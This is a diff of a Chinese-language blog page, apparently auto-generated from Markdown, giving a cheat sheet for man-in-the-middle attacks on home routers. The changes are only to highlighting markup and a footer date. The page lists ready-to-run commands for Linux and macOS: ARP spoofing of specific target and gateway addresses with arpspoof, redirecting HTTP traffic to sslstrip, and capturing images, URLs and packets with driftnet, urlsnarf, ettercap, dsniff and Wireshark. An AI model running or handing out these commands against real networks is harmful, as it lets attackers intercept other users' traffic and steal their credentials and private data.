@@ -111,67 +111,67 @@
         <p>家庭路由器中间人攻击以及数据获取。</p>
 <h2 id="arp">Arp过程介绍</h2>
 <h3 id="linux">Linux</h3>
-<pre class="codehilite"><code class="language-bash"># 开启端口转发
-echo 1 &gt;/proc/sys/net/ipv4/ip_forward
-# 监控图片
-driftnet -i eth0 -d ~/Desktop/pic -a
-driftnet -i eth0
-# 监控 URL
-urlsnarf -i eth0
-# 通过iptables 转发
+<div class="codehilite"><pre><span></span><code><span class="c1"># 开启端口转发</span>
+<span class="nb">echo</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>&gt;/proc/sys/net/ipv4/ip_forward
+<span class="c1"># 监控图片</span>
+driftnet<span class="w"> </span>-i<span class="w"> </span>eth0<span class="w"> </span>-d<span class="w"> </span>~/Desktop/pic<span class="w"> </span>-a
+driftnet<span class="w"> </span>-i<span class="w"> </span>eth0
+<span class="c1"># 监控 URL</span>
+urlsnarf<span class="w"> </span>-i<span class="w"> </span>eth0
+<span class="c1"># 通过iptables 转发</span>
 
-iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port &lt;yourListenPort&gt;
+iptables<span class="w"> </span>-t<span class="w"> </span>nat<span class="w"> </span>-A<span class="w"> </span>PREROUTING<span class="w"> </span>-p<span class="w"> </span>tcp<span class="w"> </span>--destination-port<span class="w"> </span><span class="m">80</span><span class="w"> </span>-j<span class="w"> </span>REDIRECT<span class="w"> </span>--to-port<span class="w"> </span>&lt;yourListenPort&gt;
 
-# 欺骗目标机器
-arpspoof  -i eth0 -t 192.168.2.165 192.168.2.1
-# 欺骗网关
-arpspoof -i eth0  -t 192.168.2.1 192.168.2.150
+<span class="c1"># 欺骗目标机器</span>
+arpspoof<span class="w">  </span>-i<span class="w"> </span>eth0<span class="w"> </span>-t<span class="w"> </span><span class="m">192</span>.168.2.165<span class="w"> </span><span class="m">192</span>.168.2.1
+<span class="c1"># 欺骗网关</span>
+arpspoof<span class="w"> </span>-i<span class="w"> </span>eth0<span class="w">  </span>-t<span class="w"> </span><span class="m">192</span>.168.2.1<span class="w"> </span><span class="m">192</span>.168.2.150
 
-# 过滤欺骗
-arpspoof -i eth0 -c own -t 192.168.2.213 192.168.2.1 
+<span class="c1"># 过滤欺骗</span>
+arpspoof<span class="w"> </span>-i<span class="w"> </span>eth0<span class="w"> </span>-c<span class="w"> </span>own<span class="w"> </span>-t<span class="w"> </span><span class="m">192</span>.168.2.213<span class="w"> </span><span class="m">192</span>.168.2.1<span class="w"> </span>
 
-## sslstrip -l  &lt;yourListenPort&gt;
-#负责截获数据 
-sslstrip 
-## 开启抓包工具
-wirewhark 
-</code></pre>
+<span class="c1">## sslstrip -l  &lt;yourListenPort&gt;</span>
+<span class="c1">#负责截获数据 </span>
+sslstrip<span class="w"> </span>
+<span class="c1">## 开启抓包工具</span>
+wirewhark<span class="w"> </span>
+</code></pre></div>
 
 <h3 id="mac">mac</h3>
-<pre class="codehilite"><code class="language-bash">rdr pass on en0 proto tcp from any to any port 80 -&gt; 127.0.0.1 port 8080
+<div class="codehilite"><pre><span></span><code>rdr<span class="w"> </span>pass<span class="w"> </span>on<span class="w"> </span>en0<span class="w"> </span>proto<span class="w"> </span>tcp<span class="w"> </span>from<span class="w"> </span>any<span class="w"> </span>to<span class="w"> </span>any<span class="w"> </span>port<span class="w"> </span><span class="m">80</span><span class="w"> </span>-&gt;<span class="w"> </span><span class="m">127</span>.0.0.1<span class="w"> </span>port<span class="w"> </span><span class="m">8080</span>
 
-sslstrip -l 8080 
+sslstrip<span class="w"> </span>-l<span class="w"> </span><span class="m">8080</span><span class="w"> </span>
 
-# 修改 /etc/pf.conf 文件，在适当的位置加入
-rdr-anchor &quot;http-forwarding&quot;
+<span class="c1"># 修改 /etc/pf.conf 文件，在适当的位置加入</span>
+rdr-anchor<span class="w"> </span><span class="s2">&quot;http-forwarding&quot;</span>
 
-load anchor &quot;http-forwarding&quot; from &quot;/etc/pf.anchors/http&quot;
+load<span class="w"> </span>anchor<span class="w"> </span><span class="s2">&quot;http-forwarding&quot;</span><span class="w"> </span>from<span class="w"> </span><span class="s2">&quot;/etc/pf.anchors/http&quot;</span>
 
-# 重启 packet filter，依次输入命令 sudo pfctl -ef /etc/pf.conf 和 sudo pfctl -E
+<span class="c1"># 重启 packet filter，依次输入命令 sudo pfctl -ef /etc/pf.conf 和 sudo pfctl -E</span>
 
-# 转发 sudo sysctl -w net.inet.ip.forwarding=1
-# 查看转发情况 sudo sysctl -a | grep forward
+<span class="c1"># 转发 sudo sysctl -w net.inet.ip.forwarding=1</span>
+<span class="c1"># 查看转发情况 sudo sysctl -a | grep forward</span>
 
-# arpspoof -i en0 -t (目标IP) (网关IP)
-arpspoof -i en0 -t 10.196.17.58 10.196.17.1
+<span class="c1"># arpspoof -i en0 -t (目标IP) (网关IP)</span>
+arpspoof<span class="w"> </span>-i<span class="w"> </span>en0<span class="w"> </span>-t<span class="w"> </span><span class="m">10</span>.196.17.58<span class="w"> </span><span class="m">10</span>.196.17.1
 
-arpspoof -i en0 -t 10.196.17.1 10.196.17.24
+arpspoof<span class="w"> </span>-i<span class="w"> </span>en0<span class="w"> </span>-t<span class="w"> </span><span class="m">10</span>.196.17.1<span class="w"> </span><span class="m">10</span>.196.17.24
 
-# 截获流量 
-sudo ettercap -G
-# 选择target1
+<span class="c1"># 截获流量 </span>
+sudo<span class="w"> </span>ettercap<span class="w"> </span>-G
+<span class="c1"># 选择target1</span>
 
-# 网关 欺骗 dsniff -i eth0
-</code></pre>
+<span class="c1"># 网关 欺骗 dsniff -i eth0</span>
+</code></pre></div>
 
 <h3 id="filter">filter</h3>
-<pre class="codehilite"><code class="language-bash">ip.src==192.168.2.213 and http
-</code></pre>
+<div class="codehilite"><pre><span></span><code>ip.src<span class="o">==</span><span class="m">192</span>.168.2.213<span class="w"> </span>and<span class="w"> </span>http
+</code></pre></div>
 
 <p>转载请注明出处，本文采用 <a href="http://creativecommons.org/licenses/by-nc-nd/4.0/">CC4.0</a> 协议授权</p>
     </div>
     <footer>
-        Power By Python Markdown Generate 2024-11-11 11:39:19
+        Power By Python Markdown Generate 2025-03-31 13:05:11
     </footer>
     <script>
         document.addEventListener('DOMContentLoaded', (event) => {
